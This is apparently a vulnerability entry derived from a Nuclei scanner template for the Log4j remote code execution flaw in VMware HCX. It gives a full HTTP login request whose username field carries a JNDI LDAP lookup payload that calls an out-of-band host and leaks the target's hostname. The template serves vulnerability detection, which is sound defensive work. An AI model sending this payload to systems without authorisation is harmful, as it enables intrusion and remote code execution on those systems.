# Vulnerability: VMware HCX - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`vmware-hcx-log4j-rce.yaml`)

## Description
VMware HCX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
POST /hybridity/api/sessions HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Content-Type: application/json
Origin: {{BaseURL}}

{
  "authType": "password",
  "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
  "password": "admin"
}
```

